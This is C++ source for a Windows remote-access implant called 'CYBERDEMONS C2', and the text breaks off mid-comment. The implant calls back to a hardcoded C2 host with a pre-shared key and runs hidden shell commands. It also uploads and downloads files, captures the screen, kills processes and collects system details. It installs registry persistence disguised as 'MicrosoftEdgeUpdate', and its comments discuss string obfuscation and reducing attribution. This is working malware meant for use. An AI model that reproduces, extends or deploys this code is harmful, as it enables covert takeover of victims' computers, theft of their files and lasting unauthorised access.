/*
 * pay.cpp — CYBERDEMONS C2 Windows implant
 *
 * Protocol : CYB3 (see cybproto.h) — X25519 + ChaCha20-Poly1305
 * Crypto   : cybcrypt.h, no external crypto library
 *
 * Build (MinGW-w64 cross from Linux):
 *   x86_64-w64-mingw32-windres resources.rc -o resources.o
 *   x86_64-w64-mingw32-g++ pay.cpp resources.o -o payload.exe \
 *     -lws2_32 -liphlpapi -lcrypt32 -lpsapi -lgdi32 -luser32 -s -O2 -mwindows
 *
 * The C2 address and PSK are baked in by the builder.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>

#include "cybproto.h"
#include "cybbuf.h"

#ifndef C2_HOST
#define C2_HOST "bore.pub"
#endif
#ifndef C2_PORT
#define C2_PORT 62212
#endif

#define PSK_HEX "fd4cd307f15256406dc52153eb86e89b5453f102156683cb288b4e2aa911d337"

/* Command-prefix literals live in macros, not array initialisers, so that
 * cybstrenc.py can turn them into runtime decodes. `static const char P[] =
 * "!upload "` is an array initialiser and must stay a constant expression, so
 * it cannot be replaced by a decoder call; a macro can, and strlen() works on
 * the result just as well as sizeof(P) - 1 did. */
#define CYB_UPFX "!upload "

#define MAX_XFER      (10u * 1024u * 1024u)
#define RECONNECT_MIN 5
#define RECONNECT_MAX 300
#define PING_INTERVAL 45
#define CMD_BUF       8192

/* ------------------------------------------------------------------ */
/* feature gating                                                       */
/* ------------------------------------------------------------------ */
/* Command execution is always present. Everything else is opt-out via
 * -DCYB_MINIMAL, which leaves a command-execution-only implant:
 *
 *   no file transfer, no screen capture, no process enumeration,
 *   no process kill, no registry persistence.
 *
 * The capability is genuinely absent from the binary, not hidden behind a
 * runtime flag -- the handlers are not compiled in and their Win32 APIs are
 * never imported. Smaller import table, smaller binary, less to attribute.
 * Bare commands still go through cmd.exe /c, so `dir`, `type`, `ipconfig`
 * and friends remain available regardless.
 */
#ifdef CYB_MINIMAL
#  define CYB_F_FS      0   /* !ls !download !upload        */
#  define CYB_F_PROC    0   /* !ps !kill                    */
#  define CYB_F_SCREEN  0   /* !screenshot                  */
#  define CYB_F_SYSINFO 0   /* !sysinfo                     */
#  define CYB_F_PERSIST 0   /* !persist                     */
#else
#  define CYB_F_FS      1
#  define CYB_F_PROC    1
#  define CYB_F_SCREEN  1
#  define CYB_F_SYSINFO 1
#  define CYB_F_PERSIST 1
#endif


static char current_dir[MAX_PATH];
static int  winsock_ready = 0;

static void dbg(const char *fmt, ...);

/* ------------------------------------------------------------------ */
/* small helpers                                                       */
/* ------------------------------------------------------------------ */

/* Only used by the file-transfer and screen-capture paths, so a minimal
 * build does not link them (and does not import CRYPT32). */
#if CYB_F_FS || CYB_F_SCREEN

/* Safe in-place trim: the original walked a pointer before the start of the
 * buffer when handed an empty string. */
static void trim_inplace(char *s)
{
    size_t n;
    if (!s) return;
    n = strlen(s);
    while (n > 0 && (s[n - 1] == '\n' || s[n - 1] == '\r' || s[n - 1] == ' ' || s[n - 1] == '\t'))
        s[--n] = 0;
}

/* ------------------------------------------------------------------ */
/* base64 via CryptBinaryToStringA                                      */
/* ------------------------------------------------------------------ */

static int b64_encode(const unsigned char *in, size_t in_len, char **out)
{
    DWORD len = 0;
    if (!CryptBinaryToStringA(in, (DWORD)in_len, CRYPT_STRING_BASE64, NULL, &len))
        return -1;
    *out = (char *)malloc(len);
    if (!*out) return -1;
    if (!CryptBinaryToStringA(in, (DWORD)in_len, CRYPT_STRING_BASE64, *out, &len)) {
        free(*out);
        *out = NULL;
        return -1;
    }
    trim_inplace(*out);
    return 0;
}

static int b64_decode(const char *in, size_t in_len, unsigned char **out, size_t *out_len)
{
    DWORD len = 0;
    if (in_len == 0 || in_len % 4 != 0) return -1;
    if (!CryptStringToBinaryA(in, (DWORD)in_len, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return -1;
    *out = (unsigned char *)malloc(len ? len : 1);
    if (!*out) return -1;
    if (!CryptStringToBinaryA(in, (DWORD)in_len, CRYPT_STRING_BASE64, *out, &len, NULL, NULL)) {
        free(*out);
        *out = NULL;
        return -1;
    }
    *out_len = len;
    return 0;
}
#endif /* CYB_F_FS || CYB_F_SCREEN */

/* ------------------------------------------------------------------ */
/* command implementations                                             */
/* ------------------------------------------------------------------ */

static void run_shell(cyb_ob *o, const char *cmd)
{
    char                 cmdline[CMD_BUF];
    HANDLE               rd, wr;
    SECURITY_ATTRIBUTES  sa;
    STARTUPINFOA         si;
    PROCESS_INFORMATION  pi;
    char                 buf[4096];
    DWORD                n;

    if (snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s 2>&1", cmd) >= (int)sizeof(cmdline)) {
        ob_puts(o, "command too long\r\n");
        return;
    }

    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        ob_printf(o, "CreatePipe failed (%lu)\r\n", (unsigned long)GetLastError());
        return;
    }

    /* CREATE_NO_WINDOW is the whole point: this implant is a GUI-subsystem
     * process with no console of its own, so a child cmd.exe without this flag
     * pops a visible console window on the desktop every time a command runs. */
    memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = wr;
    si.hStdError   = wr;              /* already merged by 2>&1; belt and braces */
    si.hStdInput   = NULL;

    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ob_printf(o, "CreateProcess failed (%lu)\r\n", (unsigned long)GetLastError());
        CloseHandle(rd);
        CloseHandle(wr);
        return;
    }

    /* The parent must drop its copy of the write end, otherwise the read loop
     * below never sees EOF and blocks until the C2 timeout. */
    CloseHandle(wr);

    while (ReadFile(rd, buf, sizeof(buf), &n, NULL) && n > 0)
        ob_add(o, buf, n);

    CloseHandle(rd);

    WaitForSingleObject(pi.hProcess, INFINITE);
    if (o->len == 0) {
        DWORD rc = 0;
        GetExitCodeProcess(pi.hProcess, &rc);
        ob_printf(o, "Command completed (exit: %lu)\r\n", (unsigned long)rc);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

#if CYB_F_FS
static void cmd_ls(cyb_ob *o, const char *path)
{
    char             search[MAX_PATH * 2];
    WIN32_FIND_DATAA ffd;
    HANDLE           h;

    if (path && *path) snprintf(search, sizeof(search), "%s\\*", path);
    else               snprintf(search, sizeof(search), "%s\\*", current_dir);

    h = FindFirstFileA(search, &ffd);
    if (h == INVALID_HANDLE_VALUE) {
        ob_printf(o, "Error: cannot list '%s' (%lu)\r\n",
                  (path && *path) ? path : current_dir, (unsigned long)GetLastError());
        return;
    }
    ob_printf(o, "Directory listing: %s\r\n", (path && *path) ? path : current_dir);
    ob_printf(o, "%-30s %-14s %s\r\n", "Name", "Size", "Type");
    ob_repeat(o, '-', 61); ob_puts(o, "\r\n");

    do {
        ULARGE_INTEGER li;
        const char    *type;
        if (!strcmp(ffd.cFileName, ".") || !strcmp(ffd.cFileName, "..")) continue;
        li.LowPart  = ffd.nFileSizeLow;
        li.HighPart = ffd.nFileSizeHigh;
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            type = "<DIR>";
            li.QuadPart = 0;
        } else {
            type = "    ";
        }
        ob_printf(o, "%-30s %-14llu %s\r\n", ffd.cFileName, li.QuadPart, type);
    } while (FindNextFileA(h, &ffd));

    FindClose(h);
}

static void cmd_download(cyb_ob *o, const char *path)
{
    HANDLE        hf;
    DWORD         size;
    unsigned char *buf;
    DWORD         got = 0;
    char         *b64 = NULL;

    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        ob_printf(o, "Error: cannot open '%s' (%lu)\r\n", path, (unsigned long)GetLastError());
        return;
    }
    size = GetFileSize(hf, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        CloseHandle(hf);
        ob_puts(o, "Error: file is empty or its size is unknown\r\n");
        return;
    }
    if (size > MAX_XFER) {
        CloseHandle(hf);
        ob_printf(o, "Error: file is %lu bytes, over the %u byte limit\r\n",
                  (unsigned long)size, MAX_XFER);
        return;
    }
    buf = (unsigned char *)malloc(size);
    if (!buf) { CloseHandle(hf); ob_puts(o, "Error: out of memory\r\n"); return; }

    if (!ReadFile(hf, buf, size, &got, NULL)) {
        free(buf);
        CloseHandle(hf);
        ob_puts(o, "Error: read failed\r\n");
        return;
    }
    CloseHandle(hf);

    if (b64_encode(buf, got, &b64) < 0) {
        free(buf);
        ob_puts(o, "Error: base64 encode failed\r\n");
        return;
    }
    ob_printf(o, "[DOWNLOAD]%s|", path);
    ob_puts(o, b64);
    free(buf);
    cyb_secure_zero(b64, strlen(b64));
    free(b64);
}

static void cmd_upload_raw(cyb_ob *o, const uint8_t *payload, size_t len)
{
    const char *pfx = CYB_UPFX;
    size_t      pfx_len = strlen(pfx);
    const char       *arg, *sep;
    size_t            rest, path_len, b64_len, dlen = 0;
    char              path[MAX_PATH];
    unsigned char    *dec = NULL;
    HANDLE            hf;
    DWORD             written = 0;

    if (len <= pfx_len || memcmp(payload, pfx, pfx_len) != 0) {
        ob_puts(o, "Error: malformed upload\r\n");
        return;
    }
    arg  = (const char *)payload + pfx_len;
    rest = len - pfx_len;

    sep = (const char *)memchr(arg, '|', rest);
    if (!sep) { ob_puts(o, "Error: invalid format\r\n"); return; }
    path_len = (size_t)(sep - arg);
    if (path_len == 0 || path_len >= sizeof(path)) {
        ob_puts(o, "Error: path missing or too long\r\n");
        return;
    }
    memcpy(path, arg, path_len);
    path[path_len] = 0;

    b64_len = rest - path_len - 1;
    if (b64_len / 4 * 3 > MAX_XFER) {
        ob_printf(o, "Error: encoded upload exceeds the %u byte limit\r\n", MAX_XFER);
        return;
    }
    if (b64_decode(sep + 1, b64_len, &dec, &dlen) != 0 || !dec) {
        ob_puts(o, "Error: base64 decode failed\r\n");
        return;
    }
    if (dlen > MAX_XFER) {
        free(dec);
        ob_puts(o, "Error: upload exceeds the 10MB limit\r\n");
        return;
    }
    hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        ob_printf(o, "Error: cannot write '%s' (%lu)\r\n", path, (unsigned long)GetLastError());
        free(dec);
        return;
    }
    if (dlen && !WriteFile(hf, dec, (DWORD)dlen, &written, NULL)) {
        ob_puts(o, "Error: write failed\r\n");
    } else {
        ob_printf(o, "Uploaded %lu bytes to %s\r\n", (unsigned long)written, path);
    }
    CloseHandle(hf);
    free(dec);
}
#endif /* CYB_F_FS */

#if CYB_F_PROC
static void cmd_ps(cyb_ob *o)
{
    HANDLE           snap;
    PROCESSENTRY32   pe;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        ob_puts(o, "Error: cannot enumerate processes\r\n");
        return;
    }
    ob_printf(o, "%-8s %-8s %-8s %s\r\n", "PID", "PPID", "THREADS", "NAME");
    ob_repeat(o, '-', 59); ob_puts(o, "\r\n");

    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            ob_printf(o, "%-8lu %-8lu %-8lu %s\r\n",
                      (unsigned long)pe.th32ProcessID,
                      (unsigned long)pe.th32ParentProcessID,
                      (unsigned long)pe.cntThreads,
                      pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

static void cmd_kill(cyb_ob *o, const char *arg)
{
    DWORD pid = (DWORD)strtoul(arg, NULL, 10);
    HANDLE h;

    if (pid == 0) { ob_puts(o, "Error: invalid PID\r\n"); return; }
    if (pid == GetCurrentProcessId()) {
        ob_puts(o, "Error: refusing to kill self\r\n");
        return;
    }
    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) {
        ob_printf(o, "Error: cannot open %lu (needs admin) (%lu)\r\n",
                  (unsigned long)pid, (unsigned long)GetLastError());
        return;
    }
    if (TerminateProcess(h, 1)) ob_printf(o, "Process %lu terminated\r\n", (unsigned long)pid);
    else ob_printf(o, "Error: terminate failed (%lu)\r\n", (unsigned long)GetLastError());
    CloseHandle(h);
}
#endif /* CYB_F_PROC */

#if CYB_F_SCREEN
static void cmd_screenshot(cyb_ob *o)
{
    int      sx = GetSystemMetrics(SM_CXSCREEN);
    int      sy = GetSystemMetrics(SM_CYSCREEN);
    HDC      hdcScreen, hdcMem;
    HBITMAP  bmp;
    HGDIOBJ  old;
    BITMAPINFOHEADER bmi;
    BITMAPFILEHEADER bfh;
    DWORD    img_size, total;
    BYTE    *pixels, *file;
    char    *b64 = NULL;
    int      y;

    if (sx <= 0 || sy <= 0 || (long)sx * sy > 40000000L) {
        ob_puts(o, "Error: implausible screen size\r\n");
        return;
    }
    hdcScreen = GetDC(NULL);
    if (!hdcScreen) { ob_puts(o, "Error: cannot get the screen DC\r\n"); return; }
    hdcMem = CreateCompatibleDC(hdcScreen);
    bmp = CreateCompatibleBitmap(hdcScreen, sx, sy);
    if (!hdcMem || !bmp) {
        if (bmp) DeleteObject(bmp);
        if (hdcMem) DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        ob_puts(o, "Error: cannot create a compatible bitmap\r\n");
        return;
    }
    old = SelectObject(hdcMem, bmp);
    BitBlt(hdcMem, 0, 0, sx, sy, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, old);

    ZeroMemory(&bmi, sizeof(bmi));
    bmi.biSize = sizeof(BITMAPINFOHEADER);
    bmi.biWidth = sx;
    bmi.biHeight = -sy;               /* top-down */
    bmi.biPlanes = 1;
    bmi.biBitCount = 24;
    bmi.biCompression = BI_RGB;

    img_size = (DWORD)(((sx * 24 + 31) / 32) * 4 * sy);
    total = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + img_size;
    file = (BYTE *)malloc(total);
    if (!file) {
        DeleteObject(bmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        ob_puts(o, "Error: out of memory\r\n");
        return;
    }
    memset(&bfh, 0, sizeof(bfh));
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = (DWORD)(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
    bfh.bfSize = total;

    memcpy(file, &bfh, sizeof(bfh));
    memcpy(file + sizeof(bfh), &bmi, sizeof(bmi));
    pixels = file + sizeof(bfh) + sizeof(bmi);
    if (!GetDIBits(hdcScreen, bmp, 0, (UINT)sy, pixels, (BITMAPINFO *)&bmi, DIB_RGB_COLORS)) {
        free(file);
        DeleteObject(bmp); DeleteDC(hdcMem); ReleaseDC(NULL, hdcScreen);
        ob_puts(o, "Error: GetDIBits failed\r\n");
        return;
    }

    DeleteObject(bmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    if (b64_encode(file, total, &b64) < 0) {
        free(file);
        ob_puts(o, "Error: base64 encode failed\r\n");
        return;
    }
    ob_printf(o, "[SCREENSHOT]%dx%d|", sx, sy);
    ob_puts(o, b64);
    free(file);
    cyb_secure_zero(b64, strlen(b64));
    free(b64);
    (void)y;
}
#endif /* CYB_F_SCREEN */

/* Local address of the live C2 connection, captured once per connect.
 *
 * Picking "an IP" by walking GetAdaptersInfo and taking the first non-zero
 * address is wrong on any host running a hypervisor: the adapters enumerate
 * host-only first, so on a VMware guest the host-only adapter (VMnet1,
 * 192.168.72.1) won over the NAT adapter (VMnet8, 192.168.227.1) that
 * actually carries the C2 traffic. The box reported an address it could not
 * be reached on, which is worse than reporting none.
 *
 * getsockname() on the connected socket cannot be wrong about which local
 * address the kernel selected for this flow, so ask the kernel rather than
 * guess from the adapter order.
 *
 * Left zero-initialised rather than = "N/A": a decoded string literal is not
 * a constant expression, so an array initialiser would break the build-time
 * string encryption. Empty means "not known yet". */
static char g_local_ip[64];

static void capture_local_ip(SOCKET s)
{
    struct sockaddr_in sa;
    int                 len = sizeof(sa);
    const char         *d;

    g_local_ip[0] = '\0';
    if (s != INVALID_SOCKET &&
        getsockname(s, (struct sockaddr *)&sa, &len) == 0 &&
        sa.sin_addr.s_addr != 0 &&
        /* A loopback source means the C2 peer is on this host -- the usual
         * case when testing against a local panel. 127.0.0.1 is a true answer
         * to "which address did this flow use" and a useless answer to "how do
         * I reach this box", so leave it empty and let the adapter walk answer
         * the more useful question instead. */
        (ntohl(sa.sin_addr.s_addr) >> 24) != 127 &&
        (d = inet_ntoa(sa.sin_addr)) != NULL) {
        snprintf(g_local_ip, sizeof(g_local_ip), "%s", d);
    }
}

#if CYB_F_SYSINFO
/* GetVersionExA is manifest-gated. With no RT_MANIFEST declaring Windows 8.1+
 * support the shim reports 6.2.9200 on every host, so a Win10 22H2 box
 * described itself as "Windows 6.2 build 9200" -- confidently wrong, and
 * worse than an error because nothing looks unusual. ntdll is mapped into
 * every process, so resolve RtlGetVersion from it at run time instead of
 * adding an import-table entry, and keep GetVersionExA only as a fallback
 * for a host whose ntdll does not export it. */
typedef LONG (WINAPI *cyb_pfn_rtl_get_version)(LPOSVERSIONINFOEXW);

static int os_version(DWORD *major, DWORD *minor, DWORD *build)
{
    static cyb_pfn_rtl_get_version fn = NULL;
    OSVERSIONINFOEXW               w;
    OSVERSIONINFOEXA               a;
    HMODULE                        nt;

    if (!fn) {
        nt = GetModuleHandleA("ntdll.dll");
        if (nt) {
            /* Through a union: casting FARPROC straight to a typed pointer is
             * an incompatible function-type cast, and the payload is built
             * warning-clean. */
            union { FARPROC p; cyb_pfn_rtl_get_version f; } u;
            u.p = GetProcAddress(nt, "RtlGetVersion");
            fn = u.f;
        }
    }
    if (fn) {
        ZeroMemory(&w, sizeof(w));
        w.dwOSVersionInfoSize = sizeof(w);
        if (fn(&w) == 0) {              /* NTSTATUS STATUS_SUCCESS == 0 */
            *major = w.dwMajorVersion;
            *minor = w.dwMinorVersion;
            *build = w.dwBuildNumber;
            return 1;
        }
    }
    ZeroMemory(&a, sizeof(a));
    a.dwOSVersionInfoSize = sizeof(a);
#if defined(_MSC_VER)
#  pragma warning(push)
#  pragma warning(disable: 4996)
#endif
    if (GetVersionExA((LPOSVERSIONINFOA)&a)) {
#if defined(_MSC_VER)
#  pragma warning(pop)
#endif
        *major = a.dwMajorVersion;
        *minor = a.dwMinorVersion;
        *build = a.dwBuildNumber;
        return 1;
    }
    return 0;
}

static void cmd_sysinfo(cyb_ob *o)
{
    MEMORYSTATUSEX   mem;
    SYSTEM_INFO       si;
    char              comp[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD             comp_size = sizeof(comp);
    char              user[256];
    DWORD             user_size = sizeof(user);
    char              cpu[49] = { 0 };
    int               cpu_regs[4] = { 0 };
    char              arch[16];
    char              ip[64];
    char              fallback[64] = { 0 };
    DWORD             os_major = 0, os_minor = 0, os_build = 0;
    DWORD             buf_len = 0;
    IP_ADAPTER_INFO  *ai = NULL, *p;

    strcpy(arch, "x86");
    strcpy(ip, "N/A");

    os_version(&os_major, &os_minor, &os_build);
    if (!GetComputerNameA(comp, &comp_size)) strcpy(comp, "unknown");
    if (!GetUserNameA(user, &user_size)) strcpy(user, "unknown");

    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    GetSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) strcpy(arch, "x64");

    __asm__ __volatile__(
        "cpuid"
        : "=a"(cpu_regs[0]), "=b"(cpu_regs[1]), "=c"(cpu_regs[2]), "=d"(cpu_regs[3])
        : "a"(0x80000002));
    memcpy(cpu, cpu_regs, 16);
    __asm__ __volatile__(
        "cpuid"
        : "=a"(cpu_regs[0]), "=b"(cpu_regs[1]), "=c"(cpu_regs[2]), "=d"(cpu_regs[3])
        : "a"(0x80000003));
    memcpy(cpu + 16, cpu_regs, 16);
    __asm__ __volatile__(
        "cpuid"
        : "=a"(cpu_regs[0]), "=b"(cpu_regs[1]), "=c"(cpu_regs[2]), "=d"(cpu_regs[3])
        : "a"(0x80000004));
    memcpy(cpu + 32, cpu_regs, 16);
    /* CPUID brand strings occupy 48 bytes and are space-padded to fill the
     * field, so the raw value trails a run of blanks. */
    {
        size_t n = strlen(cpu);
        while (n > 0 && cpu[n - 1] == ' ') cpu[--n] = '\0';
    }

    /* Prefer the address the C2 flow is actually using -- see
     * capture_local_ip(). Only if that is unavailable fall back to walking the
     * adapter list, and then prefer an adapter that owns a default gateway
     * rather than accepting whichever one enumerates first. */
    if (g_local_ip[0]) {
        snprintf(ip, sizeof(ip), "%s", g_local_ip);
    } else {
        GetAdaptersInfo(NULL, &buf_len);
        if (buf_len) {
            ai = (IP_ADAPTER_INFO *)malloc(buf_len);
            if (ai && GetAdaptersInfo(ai, &buf_len) == NO_ERROR) {
                for (p = ai; p; p = p->Next) {
                    if (!p->IpAddressList.IpAddress.String[0] ||
                        strcmp(p->IpAddressList.IpAddress.String, "0.0.0.0") == 0)
                        continue;
                    if (p->GatewayList.IpAddress.String[0] &&
                        strcmp(p->GatewayList.IpAddress.String, "0.0.0.0") != 0) {
                        snprintf(fallback, sizeof(fallback), "%s",
                                 p->IpAddressList.IpAddress.String);
                        break;
                    }
                    /* Keep the first gateway-less candidate in reserve: a lab
                     * VM often has no IPv4 default gateway at all. */
                    if (!fallback[0])
                        snprintf(fallback, sizeof(fallback), "%s",
                                 p->IpAddressList.IpAddress.String);
                }
            }
            free(ai);
        }
        if (fallback[0]) snprintf(ip, sizeof(ip), "%s", fallback);
    }

    ob_puts(o, "System Information\r\n");
    ob_repeat(o, '=', 40); ob_puts(o, "\r\n");
    ob_printf(o, "Computer Name : %s\r\n", comp);
    ob_printf(o, "User          : %s\r\n", user);
    ob_printf(o, "OS            : Windows %lu.%lu build %lu\r\n",
              (unsigned long)os_major, (unsigned long)os_minor,
              (unsigned long)os_build);
    ob_printf(o, "Architecture  : %s\r\n", arch);
    ob_printf(o, "CPU           : %s\r\n", cpu);
    ob_printf(o, "CPU Cores     : %lu\r\n", (unsigned long)si.dwNumberOfProcessors);
    ob_printf(o, "Memory Total  : %.2f GB\r\n", (double)mem.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
    ob_printf(o, "Memory Avail  : %.2f GB\r\n", (double)mem.ullAvailPhys / (1024.0 * 1024.0 * 1024.0));
    ob_printf(o, "IP Address    : %s\r\n", ip);
    ob_printf(o, "Working Dir   : %s\r\n", current_dir);
}
#endif /* CYB_F_SYSINFO */

#if CYB_F_PERSIST
static void cmd_persist(cyb_ob *o)
{
    HKEY  hk;
    char  path[MAX_PATH];

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) {
        ob_printf(o, "Error: cannot open the Run key (%lu)\r\n", (unsigned long)GetLastError());
        return;
    }
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
        RegCloseKey(hk);
        ob_puts(o, "Error: cannot resolve own path\r\n");
        return;
    }
    if (RegSetValueExA(hk, "MicrosoftEdgeUpdate", 0, REG_SZ,
                       (const BYTE *)path, (DWORD)strlen(path) + 1) == ERROR_SUCCESS) {
        ob_printf(o, "Persistence installed: %s\r\n", path);
    } else {
        ob_printf(o, "Error: cannot set the registry value (%lu)\r\n", (unsigned long)GetLastError());
    }
    RegCloseKey(hk);
}
#endif /* CYB_F_PERSIST */

/* ------------------------------------------------------------------ */
/* dispatch                                                            */
/* ------------------------------------------------------------------ */

static int g_disconnect = 0;

static void handle_command(const char *cmd, cyb_ob *o)
{
    if (!strncmp(cmd, "!shell ", 7)) {
        run_shell(o, cmd + 7);
    } else if (!strncmp(cmd, "!cd ", 4)) {
        if (SetCurrentDirectoryA(cmd + 4)) {
            if (!GetCurrentDirectoryA(MAX_PATH, current_dir))
                snprintf(current_dir, sizeof(current_dir), "%s", cmd + 4);
            ob_printf(o, "Changed to: %s\r\n", current_dir);
        } else {
            ob_printf(o, "Error: cannot change directory (%lu)\r\n", (unsigned long)GetLastError());
        }
    } else if (!strcmp(cmd, "!pwd")) {
        ob_printf(o, "%s\r\n", current_dir);
#if CYB_F_FS
    } else if (!strncmp(cmd, "!ls", 3)) {
        const char *p = cmd + 3;
        while (*p == ' ') p++;
        cmd_ls(o, p);
    } else if (!strncmp(cmd, "!download ", 10)) {
        cmd_download(o, cmd + 10);
    } else if (!strncmp(cmd, "!upload ", 8)) {
        cmd_upload_raw(o, (const uint8_t *)cmd, strlen(cmd));
#endif
#if CYB_F_PROC
    } else if (!strcmp(cmd, "!ps")) {
        cmd_ps(o);
    } else if (!strncmp(cmd, "!kill ", 6)) {
        cmd_kill(o, cmd + 6);
#endif
#if CYB_F_SCREEN
    } else if (!strcmp(cmd, "!screenshot")) {
        cmd_screenshot(o);
#endif
#if CYB_F_SYSINFO
    } else if (!strcmp(cmd, "!sysinfo")) {
        cmd_sysinfo(o);
#endif
#if CYB_F_PERSIST
    } else if (!strcmp(cmd, "!persist")) {
        cmd_persist(o);
#endif
    } else if (!strcmp(cmd, "!help") || !strcmp(cmd, "help")) {
        ob_puts(o,
            "Available commands:\r\n"
            "  !shell <cmd>       Execute a command (or just type it)\r\n"
            "  !cd <dir>          Change directory\r\n"
            "  !pwd               Print working directory\r\n"
#if CYB_F_FS
            "  !ls <path>         List a directory\r\n"
            "  !download <path>   Download a file (max 10MB)\r\n"
            "  !upload <path>     Upload a file (path|base64, max 10MB)\r\n"
#endif
#if CYB_F_PROC
            "  !ps                List processes\r\n"
            "  !kill <pid>        Kill a process\r\n"
#endif
#if CYB_F_SCREEN
            "  !screenshot        Capture the screen\r\n"
#endif
#if CYB_F_SYSINFO
            "  !sysinfo           System information\r\n"
#endif
#if CYB_F_PERSIST
            "  !persist           Install registry persistence\r\n"
#endif
            "  !exit              Disconnect\r\n"
            "  !help              This help\r\n"
            "Anything without a '!' prefix runs through cmd.exe /c.\r\n");
    } else if (!strcmp(cmd, "!exit")) {
        g_disconnect = 1;
    } else {
        run_shell(o, cmd);
    }
}

/* ------------------------------------------------------------------ */
/* transport                                                           */
/* ------------------------------------------------------------------ */

static int send_all(SOCKET s, const void *buf, size_t n)
{
    const char *p = (const char *)buf;
    size_t off = 0;
    while (off < n) {
        int w = send(s, p + off, (int)(n - off), 0);
        if (w <= 0) {
            if (w < 0 && WSAGetLastError() == WSAEINTR) continue;
            return -1;
        }
        off += (size_t)w;
    }
    return 0;
}

static int send_frame(cyb_session *sess, SOCKET sock, uint8_t type,
                      const void *pt, size_t ptlen)
{
    size_t   cap = CYB_HDR_LEN + ptlen + CYB_TAG_LEN;
    uint8_t *buf = (uint8_t *)malloc(cap);
    size_t   n;
    int      rc;

    if (!buf) { dbg("send_frame: out of memory"); return -1; }
    n = cyb_seal(sess, type, (const uint8_t *)pt, ptlen, buf);
    if (n == 0) {
        dbg("send_frame: seal refused");
        free(buf);
        return -1;
    }
    rc = send_all(sock, buf, n);
    if (rc != 0) dbg("send_frame: send failed (%d)", WSAGetLastError());
    free(buf);
    return rc;
}

static int recv_exact(SOCKET s, uint8_t *buf, size_t n)
{
    size_t off = 0;
    while (off < n) {
        int r = recv(s, (char *)buf + off, (int)(n - off), 0);
        if (r <= 0) {
            if (r < 0 && WSAGetLastError() == WSAEINTR) continue;
            return -1;
        }
        off += (size_t)r;
    }
    return 0;
}

static void set_socket_opts(SOCKET s)
{
    BOOL b = TRUE;
    DWORD tv = 30000;                 /* 30s keepalive idle */
    setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&b, sizeof(b));
    setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char *)&b, sizeof(b));
    setsockopt(s, IPPROTO_TCP, TCP_KEEPIDLE, (const char *)&tv, sizeof(tv));
}

static SOCKET tcp_connect(const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *ai;
    char            portstr[16];
    SOCKET          s = INVALID_SOCKET;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(portstr, sizeof(portstr), "%d", port);

    dbg("connecting to %s:%d", host, port);

    if (getaddrinfo(host, portstr, &hints, &res) != 0) {
        dbg("getaddrinfo(%s) failed (%lu)", host, (unsigned long)WSAGetLastError());
        return INVALID_SOCKET;
    }

    for (ai = res; ai; ai = ai->ai_next) {
        s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) {
            dbg("socket() failed (%lu)", (unsigned long)WSAGetLastError());
            continue;
        }
        set_socket_opts(s);
        if (connect(s, ai->ai_addr, (int)ai->ai_addrlen) == 0) {
            dbg("TCP connected");
            break;
        }
        dbg("connect() failed (%lu)", (unsigned long)WSAGetLastError());
        closesocket(s);
        s = INVALID_SOCKET;
    }
    freeaddrinfo(res);
    return s;
}

static int psk_from_hex(const char *hex, uint8_t out[32])
{
    size_t i;
    if (!hex || strlen(hex) != 64) return -1;
    for (i = 0; i < 32; i++) {
        unsigned v;
        if (sscanf(hex + i * 2, "%2x", &v) != 1) return -1;
        out[i] = (uint8_t)v;
    }
    return 0;
}

/* A tunnel provider that refuses the connection answers in plaintext before any
 * CYB3 exchange -- ngrok replies "ERR_NGROK_729 ..." when the account hits its
 * monthly TCP connection limit, for example. Without this the implant only
